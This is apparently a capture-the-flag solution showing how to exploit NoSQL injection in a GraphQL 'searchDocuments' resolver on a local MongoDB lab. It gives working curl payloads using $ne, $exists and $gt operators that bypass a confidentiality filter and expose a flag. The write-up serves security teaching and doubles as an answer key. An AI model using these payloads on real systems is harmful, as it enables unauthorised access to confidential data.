# Solution: NoSQL Injection

## Overview

This challenge demonstrates NoSQL injection vulnerabilities in GraphQL resolvers that interact with MongoDB. The `searchDocuments` query accepts a JSON filter parameter that is passed directly to MongoDB, allowing attackers to inject query operators.

## Step 1: Reconnaissance

Explore the API:

```bash
curl -X POST http://localhost:8008/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { users { _id username documents { _id title confidential } } }"
  }'
```

Notice `admin_user` has no visible documents - confidential ones are being filtered.

Check the documents directly:

```bash
curl -X POST http://localhost:8008/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { documents { _id title confidential } }"
  }'
```

Only non-confidential documents are returned.

## Step 2: Vulnerability Identification

Use introspection to discover query parameters:

```bash
curl -X POST http://localhost:8008/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { __schema { queryType { fields { name args { name type { name kind } } } } } }"
  }'
```

The `searchDocuments` query has a `titleFilter` parameter of type `JSON` - this is suspicious as it allows complex objects instead of simple strings.

## Step 3: Exploitation

The `searchDocuments` resolver passes the `titleFilter` parameter directly to MongoDB as a query filter. This allows injecting MongoDB query operators.

**Method 1 - Using $ne (not equal):**

```bash
curl -X POST http://localhost:8008/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query($filter: JSON!) { searchDocuments(titleFilter: $filter) { _id title confidential debug_info } }",
    "variables": {
      "filter": { "$ne": null }
    }
  }'
```

**Method 2 - Using $exists:**

```bash
curl -X POST http://localhost:8008/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query($filter: JSON!) { searchDocuments(titleFilter: $filter) { _id title confidential debug_info } }",
    "variables": {
      "filter": { "$exists": true }
    }
  }'
```

**Method 3 - Using $gt (greater than):**

```bash
curl -X POST http://localhost:8008/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query($filter: JSON!) { searchDocuments(titleFilter: $filter) { _id title confidential debug_info } }",
    "variables": {
      "filter": { "$gt": "" }
    }
  }'
```

## Step 4: Flag Retrieval

Any of these NoSQL injection payloads return ALL documents, bypassing the confidentiality filter. Look for documents with `confidential: true` in the response - the `debug_info` field contains the flag.

Note: The regex operator `$regex` is restricted to alphanumeric characters only, but operators like `$ne`, `$exists`, `$gt`, and `$lt` work without restrictions.

The flag follows the format: `HC{...}`
